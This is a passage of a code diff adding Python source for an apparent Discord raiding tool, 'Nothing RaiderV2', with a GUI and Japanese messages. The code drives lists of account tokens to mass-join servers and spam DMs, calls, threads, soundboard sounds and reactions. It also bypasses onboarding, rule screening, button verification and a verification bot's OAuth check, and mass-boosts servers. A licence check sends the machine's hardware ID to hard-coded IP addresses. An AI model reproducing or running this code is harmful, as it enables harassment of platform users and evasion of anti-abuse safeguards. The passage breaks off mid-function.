+            ws.send(json.dumps(identify_payload))
+    
+    def on_error(ws, error):
+        print(f"WebSocket error occurred: {error}")
+    
+    def on_close(ws, close_status_code, close_msg):
+        print(f"WebSocket connection closed: {close_status_code} - {close_msg}")
+    
+    def on_open(ws):
+        print(f"WebSocket connection opened for token: {token}")
+    
+    def send_heartbeat(ws, interval):
+        while True:
+            time.sleep(interval)
+            ws.send(json.dumps({"op": 1, "d": None}))
+    
+    ws = websocket.WebSocketApp(url,
+                                on_message=on_message,
+                                on_error=on_error,
+                                on_close=on_close,
+                                on_open=on_open)
+    
+    ws.run_forever()
+
+def set_avatar(token, avatar_path):
+    headers = {
+        'Authorization': f'{token}',
+        'Content-Type': 'multipart/form-data'
+    }
+    with open(avatar_path, 'rb') as f:
+        data = {
+            'avatar': f
+        }
+        url = f"{BASE_URL}/users/@me"
+        response = requests.patch(url, headers=headers, files=data)
+        if response.status_code == 200:
+            print(f"Successfully set avatar for token: {token}")
+        else:
+            print(f"Failed to set avatar for token: {token}. Status code: {response.status_code}")
+            
+def nonce():
+    date = datetime.now()
+    unixts = time.mktime(date.timetuple())
+    return (int(unixts)*1000-1420070400000)*4194304
+
+def read_tokens(filename):
+    with open(filename, 'r') as file:
+        tokens2 = [line.strip() for line in file]
+    return tokens2
+
+def read_tokens_from_file(file_path):
+    try:
+        with open(file_path, "r") as file:
+            tokens = file.read().splitlines()
+        return tokens
+    except Exception as e:
+        print(f"Failed to read tokens from file: {e}")
+        return []
+
+def change_global_name(token, new_name):
+    url = "https://discord.com/api/v9/users/@me"
+    cookies = get_discord_cookies()
+    payload = {
+        "global_name": new_name
+    }
+    try:
+        response = session.patch(url, json=payload, headers=get_headers(token))
+        if response.status_code == 200:
+            print(f"Username changed successfully to: {new_name} for token: {token[:10]}...")
+        elif response.status_code == 400:
+            error_data = response.json()
+            if "captcha_key" in error_data:
+                print(f"Captcha required for token {token[:10]}. Update your app and solve captcha manually.")
+            else:
+                print(f"Failed to change username for token {token[:10]}: {response.status_code} - {response.text}")
+        else:
+            print(f"Failed to change username for token {token[:10]}: {response.status_code} - {response.text}")
+    except requests.RequestException as e:
+        print(f"An error occurred for token {token[:10]}: {e}")
+
+def open_dm(token, user_id):
+    url = "https://discord.com/api/v9/users/@me/channels"
+    cookie = get_discord_cookies()
+    payload = {
+        "recipients": [user_id]
+    }
+
+    try:
+        response = session.post(
+            url,
+            headers=headers(token, cookie),
+            json=payload
+        )
+
+        if response.status_code == 200:
+            channel_id = response.json().get("id")
+            print(f"DM channel created successfully with ID: {channel_id}")
+            return channel_id
+        else:
+            print(f"Failed to create DM channel")
+            return None
+
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
+        return None
+
+def start_call(token, channel_id):
+    url = f"wss://gateway.discord.gg/?v=9&encoding=json"
+    cookie = get_discord_cookies()
+
+    def on_open(ws):
+        print("通話を開始しました。")
+
+        # Identify payload to authenticate the connection
+        identify_payload = {
+            "op": 2,
+            "d": {
+                "token": token,
+                "capabilities": 125,
+                "properties": {
+                    "os": "Windows",
+                    "browser": "Chrome",
+                    "device": "",
+                },
+                "compress": False,
+                "client_state": {
+                    "guild_hashes": {},
+                    "highest_last_message_id": "0",
+                    "read_state_version": 0,
+                    "user_guild_settings_version": -1
+                }
+            }
+        }
+        ws.send(json.dumps(identify_payload))
+
+        # Start call payload
+        start_call_payload = {
+            "op": 4,
+            "d": {
+                "guild_id": None,
+                "channel_id": channel_id,
+                "self_mute": False,
+                "self_deaf": False
+            }
+        }
+        ws.send(json.dumps(start_call_payload))
+
+    def on_error(ws, error):
+        print(f"WebSocket error: {error}")
+
+    def on_close(ws):
+        print("WebSocket connection closed")
+
+    ws = websocket.WebSocketApp(
+        url,
+        on_open=on_open,
+        on_error=on_error,
+        on_close=on_close,
+        header=headers(token, cookie)
+    )
+
+    ws.run_forever()
+    
+def spam_dm(token, channel_id, message):
+    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
+    cookies = get_discord_cookies()
+    payload = {
+        "content": message
+    }
+
+    try:
+        response = session.post(
+            url,
+            headers=headers(token, cookies),
+            json=payload
+        )
+
+        if response.status_code == 200:
+            print(f"Message sent successfully to channel ID: {channel_id}")
+        else:
+            error_message = response.json().get("message", YELLOW + "[CAPTCHA]" + END)
+            print(f"Failed to send message: {error_message}")
+
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
+
+def open_dm_and_spam(user_id, message, dm_spam, call_spam, token):
+    global stop_spamming
+
+    while not stop_spamming:
+        channel_id = open_dm(token, user_id)
+        if channel_id:
+            if dm_spam:
+                spam_dm(token, channel_id, message)
+            if call_spam:
+                start_call(token, channel_id)
+        else:
+            print("DM チャネルの作成に失敗しました。")
+
+def read_tokens(file_path):
+    with open(file_path, "r") as file:
+        return file.read().splitlines()
+
+def vc_joiner(token, guild, channel):
+    try:
+        ws = websocket.WebSocket()
+        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
+        ws.send(json.dumps({
+            "op": 2,
+            "d": {
+                "token": token,
+                "properties": {
+                    "$os": "windows",
+                    "$browser": "Discord",
+                    "$device": "desktop"
+                }
+            }
+        }))
+        ws.send(json.dumps({
+            "op": 4,
+            "d": {
+                "guild_id": guild,
+                "channel_id": channel,
+                "self_mute": False,
+                "self_deaf": False
+            }
+        }))
+        print(f"Joined VC with token: {token[:25]}...")
+    except Exception as e:
+        print(f"Failed to join VC with token: {token[:25]}... Error: {e}")
+
+def soundboard(token, channel_id):
+    try:
+        session = requests.Session()
+        cookies = get_discord_cookies()
+        sounds = session.get(
+            "https://discord.com/api/v9/soundboard-default-sounds",
+            headers=headers(token, cookies)
+        ).json()
+
+        while True:
+            sound = random.choice(sounds)
+            name = sound.get("name")
+            payload = {
+                "emoji_id": None,
+                "emoji_name": sound.get("emoji_name"),
+                "sound_id": sound.get("sound_id"),
+            }
+
+            response = session.post(
+                f'https://discord.com/api/v9/channels/{channel_id}/send-soundboard-sound', 
+                headers=headers(token, cookies), 
+                json=payload,
+            )
+
+            if response.status_code == 204:
+                print(f"サウンドの再生に成功！ {name}")
+            elif response.status_code == 429:
+                retry_after = response.json().get("retry_after")
+                print(f"レートリミット - {retry_after}秒後に再試行。")
+                time.sleep(float(retry_after))
+            else:
+                print(f"Failed to play sound: {response.json().get('message')}")
+    except Exception as e:
+        print(f"音声を再生できません。: {e}")
+
+def fetch_form_fields(token, guild_id):
+    url = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification"
+    params = {"with_guild": "true"}
+    try:
+        response = requests.get(url, headers=get_headers(token), params=params)
+        response.raise_for_status()
+        return response.json().get('form_fields', [])
+    except requests.exceptions.HTTPError as err:
+        print(f"HTTP error occurred while fetching form fields: {err}")
+        return []
+    except Exception as err:
+        print(f"An error occurred while fetching form fields: {err}")
+        return []
+
+def rule_bypass(token, guild_id):
+    url_get = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification"
+    params = {"with_guild": "true"}
+    
+    try:
+        response_get = requests.get(url_get, headers=get_headers(token), params=params)
+        response_get.raise_for_status()
+        verification_info = response_get.json()
+    except requests.exceptions.HTTPError as err:
+        print(f"HTTP error occurred during GET request: {err}")
+        return
+    except Exception as err:
+        print(f"An error occurred during GET request: {err}")
+        return
+
+    version = verification_info.get('version')
+    if not version:
+        print("バージョンの取得に失敗....")
+        return
+
+    form_fields = fetch_form_fields(token, guild_id)
+    if not form_fields:
+        print("フォームフィールドを取得できませんでした。.")
+        return
+
+    url_put = f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me"
+    payload = {
+        "version": version,
+        "form_fields": form_fields
+    }
+
+    headers = get_headers(token)
+
+    try:
+        response_put = requests.put(url_put, headers=headers, json=payload)
+        response_put.raise_for_status()
+        print("認証を完了しました！")
+    except requests.exceptions.HTTPError as err:
+        print(f"HTTP error occurred during PUT request: {err}")
+        print(f"Response content: {response_put.content.decode()}") 
+    except Exception as err:
+        print(f"An error occurred during PUT request: {err}")
+
+
+def bypassBedrock(guild_id, token):
+    state = generate_precise_state(guild_id)
+    
+    params = {
+        'client_id': '1325891361899151440',
+        'response_type': 'code',
+        'redirect_uri': 'https://bedrock.aa-bot.com/',
+        'scope': 'identify guilds.join',
+        'state': state,
+    }
+
+    json_data = {
+        'guild_id': guild_id,
+        'permissions': '0',
+        'authorize': True,
+        'integration_type': 0,
+        'location_context': {
+            'guild_id': '10000',
+            'channel_id': '10000',
+            'channel_type': 10000,
+        },
+    }
+
+    response = requests.post(
+        'https://discord.com/api/v9/oauth2/authorize',
+        params=params,
+        headers=get_headers(token),
+        json=json_data,
+    )
+
+    if response.status_code == 200:
+        json_response = response.json()
+        if "location" in json_response:
+            url = json_response["location"]
+            response_url = requests.get(url)
+
+            if response_url.status_code == 200:
+                print("認証突破成功!!")
+            else:
+                print(f"Error {response_url.status_code}: {response_url.text}")
+        else:
+            print("urlが存在しません。")
+    else:
+        print(f"Error {response.status_code}: {response.text}")
+
+def get_user_id_from_token(token):
+    url = "https://discord.com/api/v9/users/@me"
+    
+    try:
+        response = requests.get(url, headers=get_headers(token))
+        response.raise_for_status()
+        user_data = response.json()
+        return user_data['id']
+    except requests.exceptions.HTTPError as err:
+        print(f"HTTP error occurred while getting user ID: {err}")
+        return None
+    except Exception as err:
+        print(f"An error occurred while getting user ID: {err}")
+        return None
+
+def get_random_image_file():
+    png_files = [file for file in os.listdir(PICTURE_FOLDER) if file.lower().endswith('.png')]
+    if not png_files:
+        raise FileNotFoundError("悲しいことにPngファイルは出掛けてしまった！！")
+    return os.path.join(PICTURE_FOLDER, random.choice(png_files))
+
+def change_avatar(token): # Onlinerを使わないと動かないことを忘れないでね！！！Onlinerと統合してもいいけど
+    url = "https://discord.com/api/v9/users/@me"
+
+    image_path = get_random_image_file()
+
+    with open(image_path, 'rb') as image_file:
+        image_data = image_file.read()
+
+    image_base64 = base64.b64encode(image_data).decode('utf-8')
+    hide_token = token[:25].rstrip() + '#'
+    payload = {
+        "avatar": f"data:image/png;base64,{image_base64}" 
+    }
+    
+    try:
+        response = session.patch(url, headers=get_headers(token), json=payload)
+        
+        if response.status_code == 200:
+            print(f"アバターの変更に成功 {hide_token}")
+        else:
+            print(f"アバターの変更に失敗 Onlinerを試してください。 {hide_token} Status code: {response.status_code}") # Captcha or Onlinerを使ってない
+
+    except requests.exceptions.RequestException as err:
+        print(f"不明なエラーによりアバターの変更に失敗 {hide_token}: {err}")
+
+def start_avatar_change_threads():
+    threads = []
+    for token in tokens:
+        thread = threading.Thread(target=change_avatar, args=(token,))
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+def button_bypass(token, message_id, channel_id, guild_id, button_option):
+    try:
+        payload = {
+            'limit': '50',
+            'around': message_id,
+        }
+
+        response = session.get(
+            f'https://discord.com/api/v9/channels/{channel_id}/messages',
+            params=payload,
+            headers=get_headers(token)
+        )
+        hide_token = token[:25].rstrip() + '#'
+        if response.status_code != 200:
+            print(f"サーバーに入っていません | {hide_token}")
+            return
+
+        try:
+            messages = response.json()
+        except ValueError:
+            print("レスポンスに無効なデータが含まれています。")
+            return
+
+        if isinstance(messages, list):
+            messagebottoclick = next((x for x in messages if x["id"] == message_id), None)
+        else:
+            print("メッセージが届いた:", type(messages))
+            return
+
+        if messagebottoclick is None:
+            print("Message not found")
+            return
+
+        buttons = []
+        for component in messagebottoclick.get("components", []):
+            for button in component.get("components", []):
+                buttons.append(button)
+
+        if not buttons:
+            print("ボタンはありません。")
+            return
+
+        button_index = int(button_option) - 1
+
+        if button_index < 0 or button_index >= len(buttons):
+            print("無効なボタンです。")
+            return
+
+        data = {
+            'application_id': messagebottoclick["author"]["id"],
+            'channel_id': channel_id,
+            'data': {
+                'component_type': 2,
+                'custom_id': buttons[button_index]["custom_id"],
+            },
+            'guild_id': guild_id,
+            'message_flags': 0,
+            'message_id': message_id,
+            'nonce': nonce(),
+            'session_id': uuid.uuid4().hex,
+            'type': 3,
+        }
+
+        response = session.post(
+            'https://discord.com/api/v9/interactions',
+            headers=get_headers(token),
+            json=data
+        )
+
+        if response.status_code == 204:
+            print("成功", f"{token[:25]}##")
+        else:
+            print("失敗", f"{token[:25]}##")
+    except Exception as e:
+        print("失敗", "ボタンのクリックに失敗", e)
+
+def thread_spam(token, channel_id, name):
+    url = f'https://discord.com/api/v9/channels/{channel_id}/threads'
+    
+    while True:
+        try:
+            payload = {
+                'name': f'{name}|{uuid.uuid4().hex}',
+                'type': 11,
+                'auto_archive_duration': random.choice([60, 1440, 4320, 10080]),
+            }
+
+            response = requests.post(url, headers=get_headers(token), json=payload)
+            
+            if response.status_code == 201:
+                print("スレッド作成成功")
+            else:
+                print(f"スレッド作成失敗 | {response.status_code}, {response.text}")
+        except Exception as e:
+            print(f"エラーが発生しました: {e}")
+
+def server_boost(guild_id, boost_count, token):
+    # サーバーブーストを実行する関数
+    url = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
+    url2 = "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots"
+
+    # ユーザーのブーストスロットを取得
+    response_get = requests.get(url2, headers=get_headers(token))
+    if response_get.status_code != 200:
+        print(f"トークン {token} でブーストスロットの取得に失敗: ステータスコード {response_get.status_code}")
+        return 0  # 失敗した場合はブースト数0を返す
+
+    # 利用可能なスロット情報を取得
+    slots = response_get.json()
+    available_slots = [slot['id'] for slot in slots if not slot.get('premium_guild_subscription_id')]
+
+    if not available_slots:
+        print(f"トークン {token} で利用可能なスロットがありません。")
+        return 0
+
+    # 利用可能なスロット数と希望するブースト回数の最小値を計算
+    boost_to_use = min(boost_count, len(available_slots))
+    payload = {
+        'user_premium_guild_subscription_slot_ids': available_slots[:boost_to_use]
+    }
+
+    # サーバーブーストを送信
+    response = requests.put(url, headers=get_headers(token), json=payload)
+    if response.status_code in (200, 201):
+        print(f"トークン {token} で {boost_to_use} 回のブーストに成功しました。")
+        return boost_to_use  # 成功したブースト数を返す
+    else:
+        print(f"トークン {token} でブーストに失敗しました: ステータスコード {response.status_code}")
+        return 0  # 失敗した場合はブースト数0を返す
+
+def boost_with_multiple_tokens(guild_id, boost_count):
+    # tokens.txt からトークンを読み込む
+    with open('tokens.txt', 'r') as file:
+        tokens = [line.strip() for line in file.readlines()]
+
+    remaining_boosts = boost_count
+    for token in tokens:
+        if remaining_boosts <= 0:
+            print("すべてのブーストが完了しました。")
+            break
+
+        print(f"トークン {token} を使用してブーストを試みます。")
+        # トークンを使用して限界までブーストを試みる
+        boosts_done = server_boost(guild_id, remaining_boosts, token)
+
+        # 残りのブースト回数を更新
+        remaining_boosts -= boosts_done
+        print(f"残りのブースト回数: {remaining_boosts}")
+
+    if remaining_boosts > 0:
+        print(f"指定されたブースト回数 {boost_count} を達成できませんでした。残り: {remaining_boosts}")
+    else:
+        print("すべての指定されたブーストが完了しました。")
+
+def switch_to_main_ui():
+    for widget in root.winfo_children():
+        widget.destroy()
+    setup_main_ui()
+
+def setup_main_ui():
+    tab_buttons_frame = ctk.CTkFrame(root, width=150)
+    tab_buttons_frame.pack(side="left", fill="y")
+
+    tab_buttons_canvas = ctk.CTkCanvas(tab_buttons_frame, width=150)
+    tab_buttons_canvas.pack(side="left", fill="both", expand=True)
+
+    scrollbar = ctk.CTkScrollbar(tab_buttons_frame, orientation="vertical", command=tab_buttons_canvas.yview)
+    scrollbar.pack(side="right", fill="y")
+    tab_buttons_canvas.configure(yscrollcommand=scrollbar.set)
+
+    tab_buttons_inner_frame = ctk.CTkFrame(tab_buttons_canvas, width=150)
+    tab_buttons_canvas.create_window((0, 0), window=tab_buttons_inner_frame, anchor="nw")
+
+    tab_buttons_inner_frame.bind("<Configure>", lambda e: tab_buttons_canvas.configure(scrollregion=tab_buttons_canvas.bbox("all")))
+
+    def _on_mouse_wheel(event):
+        tab_buttons_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
+
+    tab_buttons_canvas.bind_all("<MouseWheel>", _on_mouse_wheel)
+
+    create_tab_button(tab_buttons_inner_frame, "KeyChanger", lambda: switch_tab(change_key_ui))
+    create_tab_button(tab_buttons_inner_frame, "Joiner", lambda: switch_tab(joiner_tab))
+    create_tab_button(tab_buttons_inner_frame, "Leaver", lambda: switch_tab(leaver_tab))
+    create_tab_button(tab_buttons_inner_frame, "Booster", lambda: switch_tab(boost_tab))
+    create_tab_button(tab_buttons_inner_frame, "OLD Spammer", lambda: switch_tab(spammerOLD_tab))
+    create_tab_button(tab_buttons_inner_frame, "Token Checker", lambda: switch_tab(check_tokens_tab))
+    create_tab_button(tab_buttons_inner_frame, "Reaction", lambda: switch_tab(reaction_tab))
+    create_tab_button(tab_buttons_inner_frame, "Fake Typer", lambda: switch_tab(fake_typer_tab))
+    create_tab_button(tab_buttons_inner_frame, "All Channel Spam", lambda: switch_tab(all_channel_spam_tab))
+    create_tab_button(tab_buttons_inner_frame, "Format Changer", lambda: switch_tab(format_changer_tab))
+    create_tab_button(tab_buttons_inner_frame, "Bot", lambda: switch_tab(bot_tab))
+    create_tab_button(tab_buttons_inner_frame, "Onliner", lambda: switch_tab(onliner_tab))
+    create_tab_button(tab_buttons_inner_frame, "New Spammer", lambda: switch_tab(new_spammer_tab))
+    create_tab_button(tab_buttons_inner_frame, "Command spammer", lambda: switch_tab(command_spammer_tab))
+    create_tab_button(tab_buttons_inner_frame, "Nick Changer", lambda: switch_tab(change_global_name_ui))
+    create_tab_button(tab_buttons_inner_frame, "Avatar Changer", lambda: switch_tab(avatar_changer_ui))
+    create_tab_button(tab_buttons_inner_frame, "MassDM", lambda: switch_tab(open_dm_spam_tab))
+    create_tab_button(tab_buttons_inner_frame, "VC Joiner and Spammer", lambda: switch_tab(vc_joiner_ui))
+    create_tab_button(tab_buttons_inner_frame, "Onboarding Bypass", lambda: switch_tab(onboarding_bypass_tab))
+    create_tab_button(tab_buttons_inner_frame, "Bio Changer", lambda: switch_tab(bio_changer_ui))
+    create_tab_button(tab_buttons_inner_frame, "Bedrock bypasser", lambda: switch_tab(bedrockbypassui))
+    create_tab_button(tab_buttons_inner_frame, "Rule Bypass", lambda: switch_tab(rule_bypass_ui))
+    create_tab_button(tab_buttons_inner_frame, "Button pusher", lambda: switch_tab(button_pusher_ui))
+    create_tab_button(tab_buttons_inner_frame, "Thread Spammer", lambda: switch_tab(thread_spam_ui))
+    create_tab_button(tab_buttons_inner_frame, "Info", lambda: switch_tab(info))
+
+    global content_frame
+    content_frame = ctk.CTkFrame(root)
+    content_frame.pack(side="right", fill="both", expand=True)
+
+    switch_tab(info)
+
+def create_tab_button(parent, text, command):
+    button = ctk.CTkButton(parent, text=text, command=command, width=150)
+    button.pack(pady=5, padx=5)
+
+def switch_tab(tab_function):
+    for widget in content_frame.winfo_children():
+        widget.destroy()
+
+    tab_function(content_frame)
+
+def boost_tab(frame):
+    # UI要素の削除
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    # ギルドID入力フィールド
+    guild_label = ctk.CTkLabel(frame, text="Guild ID")
+    guild_label.pack(pady=5)
+    guild_entry = ctk.CTkEntry(frame)
+    guild_entry.pack(pady=5)
+
+    # ブースト回数入力フィールド
+    boost_label = ctk.CTkLabel(frame, text="Boost Count")
+    boost_label.pack(pady=5)
+    boost_entry = ctk.CTkEntry(frame)
+    boost_entry.pack(pady=5)
+
+    # ブースト実行ボタン
+    boost_button = ctk.CTkButton(frame, text="ブースト開始", command=lambda: threading.Thread(target=start_boosting, args=(guild_entry.get(), boost_entry.get())).start())
+    boost_button.pack(pady=20)
+
+def start_boosting(guild_id, boost_count):
+    try:
+        # 入力値を整数に変換
+        guild_id = int(guild_id)
+        boost_count = int(boost_count)
+        
+        if guild_id <= 0 or boost_count <= 0:
+            print("無効なギルドIDまたはブースト回数です。")
+            return
+        
+        # ブースト処理を開始
+        print(f"ギルドID: {guild_id}, ブースト回数: {boost_count} を処理中...")
+        boost_with_multiple_tokens(guild_id, boost_count)
+    
+    except ValueError:
+        print("ギルドIDとブースト回数は数字で入力してください。")
+
+def read_key_from_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            key = file.read().strip()
+        return key
+    except IOError as e:
+        tkinter.messagebox.showerror("File Error", str(e))
+        return None
+
+def write_key_to_file(file_path, key):
+    try:
+        with open(file_path, 'w') as file:
+            file.write(key)
+        print("キーを自動保存しました。")
+    except IOError as e:
+        tkinter.messagebox.showerror("File Error", str(e))
+        print(f"ファイルへの書き込みエラー: {str(e)}")
+
+def setup_login_ui():
+    login_frame = ctk.CTkFrame(root)
+    login_frame.pack(fill="both", expand=True)
+    
+    api_key_label = ctk.CTkLabel(login_frame, text="Key")
+    api_key_label.pack(pady=10)
+    
+    api_key_entry = ctk.CTkEntry(login_frame, show="*")
+    api_key_entry.pack(pady=10)
+    
+    login_button = ctk.CTkButton(login_frame, text="Login", command=lambda: handle_key_validation(api_key_entry.get()))
+    login_button.pack(pady=20)
+
+    api_key = read_key_from_file('key.txt')
+    if api_key:
+        print("保存されたキーから認証しています...")
+        handle_key_validation(api_key)
+
+# SMBIOS情報の取得
+def get_hwid():
+    c = wmi.WMI()
+    for system in c.Win32_ComputerSystemProduct():
+        return system.UUID
+
+def handle_key_validation(api_key):
+    try:
+        os.system('title Nothing RaiderV2')
+        print("サーバーに接続しています。3秒ほど待つ場合がございますが、閉じずにお待ち下さい....")
+        hwid = get_hwid()
+        response = requests.post('http://209.25.142.16:2374/validate_key', json={"api_key": api_key, "hwid": hwid})
+        if response.status_code == 200:
+            os.system('cls')
+            print("認証完了!")
+            write_key_to_file('key.txt', api_key)
+            switch_to_main_ui()
+        else:
+            tkinter.messagebox.showerror("認証に失敗", "無効なキー")
+            print(f"認証失敗: {response.status_code}")
+    except requests.RequestException as e:
+        tkinter.messagebox.showerror("サーバーに接続できません。", str(e))
+        print(f"リクエストエラー: {str(e)}") 
+
+def switch_to_main_ui():
+    for widget in root.winfo_children():
+        widget.destroy()
+    setup_main_ui()
+
+def change_key_ui(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    key_label = ctk.CTkLabel(frame, text="現在のキー:")
+    key_label.pack(pady=5)
+
+    old_key_entry = ctk.CTkEntry(frame, width=250)
+    old_key_entry.pack(pady=5)
+
+    def change_key():
+        old_key = old_key_entry.get()
+        try:
+            response = requests.post('http://46.250.233.220:25592/change_key', json={"old_key": old_key})
+            if response.status_code == 200:
+                new_key = response.json().get('new_key')
+                tkinter.messagebox.showinfo("キー更新", f"新しいキー: {new_key}")
+                print(f"新しいキー: {new_key}")
+            else:
+                tkinter.messagebox.showerror("更新失敗", "無効なキー")
+                print(f"更新失敗: {response.status_code}")
+        except requests.RequestException as e:
+            tkinter.messagebox.showerror("サーバーに接続できません。", str(e))
+            print(f"リクエストエラー: {str(e)}")
+
+    change_key_button = ctk.CTkButton(frame, text="キー変更", command=change_key)
+    change_key_button.pack(pady=20)
+
+def joiner_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    invite_label = ctk.CTkLabel(frame, text="招待リンク")
+    invite_label.pack(pady=5)
+
+    invite_entry = ctk.CTkEntry(frame, width=250)
+    invite_entry.pack(pady=5)
+
+    use_captcha_var = ctk.BooleanVar()
+    use_captcha_checkbox = ctk.CTkCheckBox(frame, text="CapSolverを使用(Capsolverは現在Discordでは使用できません。)", variable=use_captcha_var)
+    use_captcha_checkbox.pack(pady=5)
+
+    def start_joining():
+        invite = invite_entry.get()
+        tokens = read_tokens('tokens.txt')
+        invite_code = extract_invite_code(invite)
+        use_captcha = use_captcha_var.get()
+
+        if invite_code:
+            def process_tokens():
+                try:
+                    threads = []
+                    for token in tokens:
+                        thread = threading.Thread(target=joiner, args=(token, invite_code, use_captcha))
+                        threads.append(thread)
+                        thread.start()
+                        time.sleep(0.05)
+                    for thread in threads:
+                        thread.join()
+
+                except Exception as e:
+                    print(f"Error processing tokens: {e}")
+
+            thread = threading.Thread(target=process_tokens)
+            thread.start()
+        else:
+            tkinter.messagebox.showwarning("Error", "正しくないURL")
+
+    join_button = ctk.CTkButton(frame, text="参加", command=start_joining)
+    join_button.pack(pady=20)
+
+def read_tokens(file_path):
+    with open(file_path, "r") as f:
+        tokens = f.read().splitlines()
+
+    return tokens
+
+def onboard_bypass(guild_id, tokens):
+    onboarding_responses_seen = {}
+    onboarding_prompts_seen = {}
+    onboarding_responses = []
+    in_guild = []
+    cookie = get_discord_cookies()
+
+    try:
+        for token in tokens:
+            response = session.get(
+                f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
+                headers=headers(token, cookie)
+            )
+            if response.status_code == 200:
+                in_guild.append(token)
+                break
+
+        if not in_guild:
+            hide_token = token[:25].rstrip() + '#'
+            print(f"失敗[このtokenはサーバーに入っていません。| {hide_token}")
+            return
+
+        data = response.json()
+        now = int(datetime.now().timestamp())
+
+        for prompt in data.get("prompts", []):
+            onboarding_responses.append(prompt["options"][-1]["id"])
+            onboarding_prompts_seen[prompt["id"]] = now
+
+            for option in prompt["options"]:
+                if option:
+                    onboarding_responses_seen[option["id"]] = now
+
+        def run_task(token):
+            try:
+                json_data = {
+                    "onboarding_responses": onboarding_responses,
+                    "onboarding_prompts_seen": onboarding_prompts_seen,
+                    "onboarding_responses_seen": onboarding_responses_seen,
+                }
+
+                response = session.post(
+                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
+                    headers=headers(token, cookie),
+                    json=json_data
+                )
+                hide_token = token[:25].rstrip() + '*'
+                if response.status_code == 200:
+                    print(f"成功: {hide_token}")
+                else:
+                    print(f"失敗: {hide_token} - {response.json().get('message')}")
+            except Exception as e:
+                print(f"失敗: {hide_token} - {e}")
+
+        threads = []
+        for token in tokens:
+            thread = threading.Thread(target=run_task, args=(token,))
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+    except Exception as e:
+        print(f"オンボード回避に失敗。{e}")
+
+def start_onboarding_bypass(guild_id):
+    with open("tokens.txt", "r") as f:
+        tokens = f.read().splitlines()
+    onboard_bypass(guild_id, tokens)
+
+def bio_changer(token, bio):
+    cookie = get_discord_cookies()
+    payload = {
+        "bio": bio
+    }
+    while True:
+        try:
+            response = session.patch(
+                "https://discord.com/api/v9/users/@me/profile",
+                headers=headers(token, cookie),
+                json=payload
+            )
+
+            if response.status_code == 200:
+                print(f"Changed bio to: {bio}")
+                return f"Bio changed for token: {token}"
+            elif response.status_code == 429:
+                retry_after = response.json().get("retry_after", 0)
+                print(f"Rate limit exceeded - retrying in {retry_after}s")
+                time.sleep(float(retry_after))
+            else:
+                error_message = response.json().get('message', 'Unknown error')
+                print(f"Failed to change bio: {response.status_code} - {error_message}")
+                return f"Failed to change bio for token {token}: {response.status_code} - {error_message}"
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            return f"An error occurred for token {token}: {e}"
+
+def leaver_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    server_label = ctk.CTkLabel(frame, text="Guild IDを貼ってください。")
+    server_label.pack(pady=5)
+    server_entry = ctk.CTkEntry(frame)
+    server_entry.pack(pady=5)
+    leave_button = ctk.CTkButton(frame, text="退出", command=lambda: threading.Thread(target=leaver, args=(server_entry.get(),)).start())
+    leave_button.pack(pady=20)
+
+def stop_spammerOLD():
+    global spammingOLD
+    spammingOLD = False
+
+def spammerOLD_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    channel_label = ctk.CTkLabel(frame, text="ChannelIDを貼ってください。")
+    channel_label.pack(pady=5)
+    channel_entry = ctk.CTkEntry(frame)
+    channel_entry.pack(pady=5)
+    message_label = ctk.CTkLabel(frame, text="スパムするメッセージ")
+    message_label.pack(pady=5)
+    message_entry = ctk.CTkTextbox(frame, width=500, height=250)
+    message_entry.pack(pady=5)
+    spam_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=spammerOLD, args=(channel_entry.get(), message_entry.get("1.0", "end-1c"))).start())
+    spam_button.pack(pady=5)
+    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammerOLD)
+    stop_button.pack(pady=5)
+
+def check_tokens_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+
+    check_button = ctk.CTkButton(frame, text="Tokenチェック", command=start_checking_tokens)
+    check_button.pack(pady=20)
+
+def start_checking_tokens():
+    global tokens
+    tokens = read_tokens('tokens.txt')
+    thread = threading.Thread(target=check_and_remove_invalid_tokens)
+    thread.start()
+
+def reaction_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    channel_label = ctk.CTkLabel(frame, text="ChannelID")
+    channel_label.pack(pady=5)
+    channel_entry = ctk.CTkEntry(frame)
+    channel_entry.pack(pady=5)
+    message_label = ctk.CTkLabel(frame, text="メッセージID")
+    message_label.pack(pady=5)
+    message_entry = ctk.CTkEntry(frame)
+    message_entry.pack(pady=5)
+    emoji_label = ctk.CTkLabel(frame, text="リアクションする絵文字")
+    emoji_label.pack(pady=5)
+    emoji_entry = ctk.CTkEntry(frame)
+    emoji_entry.pack(pady=5)
+    react_button = ctk.CTkButton(frame, text="リアクション", command=lambda: threading.Thread(target=react_to_message, args=(channel_entry.get(), message_entry.get(), emoji_entry.get())).start())
+    react_button.pack(pady=20)
+
+def fake_typer_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    
+    channel_label = ctk.CTkLabel(frame, text="ChannelIDを入力してください:")
+    channel_label.pack(pady=5)
+    
+    channel_entry = ctk.CTkEntry(frame, width=250)
+    channel_entry.pack(pady=5)
+    
+    def start_fake_typers():
+        global threads
+        global stop_event
+
+        channel_id = channel_entry.get().strip()
+        if not channel_id:
+            tkinter.messagebox.showerror("エラー", "Channel IDを入力してください。")
+            return
+        stop_event.clear()
+        for token in tokens:
+            thread = threading.Thread(target=fake_typer, args=(channel_id, token))
